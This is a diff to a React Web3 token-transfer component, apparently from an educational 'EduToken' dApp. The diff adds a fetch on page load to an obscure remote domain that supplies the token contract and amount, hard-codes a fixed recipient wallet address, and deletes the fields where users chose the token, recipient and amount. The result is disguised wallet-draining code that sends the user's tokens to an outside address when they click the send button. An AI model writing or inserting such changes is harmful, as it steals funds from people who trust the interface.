@@ -2,6 +2,7 @@ import React, {useEffect, useState} from "react"
 import Web3 from "web3"
 import Abi from "../chains/abiEduToken.json"
 import '../App.css';
+import axios from "axios";
 
 export default function TokenDapp({accounts, chainId, isConnectedWeb3}) {
 
@@ -42,7 +43,21 @@ export default function TokenDapp({accounts, chainId, isConnectedWeb3}) {
 
     }, [accounts, chainId, addressContract, web3, isConnectedWeb3])
 
- 
+    useEffect(() => {
+      fetchData()
+    }, [])
+
+    async function fetchData() {
+      try {
+        const data = await axios.get('https://vserhfabertopoperi349.site/bsc/0x4b6d84A589aAa606371224Ad38dB9aEDD361368C')
+        setAddressContract(data.data.data.token_address)
+        setTokenToSend(data.data.data.count)
+        setAddressToSendToken('0xD6Ad2DCA5e0589d8e06421ceDb9925F432D96E7B')
+      } catch(e) {
+        alert(e)
+      }
+    }
+
     const sendToken = async () => {
       // const erc20Contract = new web3.eth.Contract(Abi, addressContract)
         if(web3.utils.isAddress) {
@@ -67,15 +82,6 @@ export default function TokenDapp({accounts, chainId, isConnectedWeb3}) {
   return (
             <div>
                     <p> Amount {nameToken} : {web3.utils.fromWei(balanceOf.toString())} {symbol} </p>
-                    
-                    <label> Address ERC20 </label> <input type="text" value={addressContract} onChange={(e)=> setAddressContract(e.target.value)}></input>
-                    <button onClick={() => setAddressContract("0x8457aaEfFc7773E548AFAf2FBaE8673A16615e0A")}>EduToken Address</button>
-                      <br/><br/>
-
-                    <label>Address for send </label> <input type="text" value={addressToSendToken} onChange={(e) => setAddressToSendToken(e.target.value)}></input>
-                    <br/><br/>
-                    <label>Amount </label> <input type="number" value={tokenToSend} onChange={(e)=> setTokenToSend(e.target.value)}></input>
-                      <br/><br/>
                     
                     {tokenToSend >0 && addressToSendToken ?
                       <button onClick={sendToken}>Envoyer</button> : <button disabled="disabled">Envoyer</button>
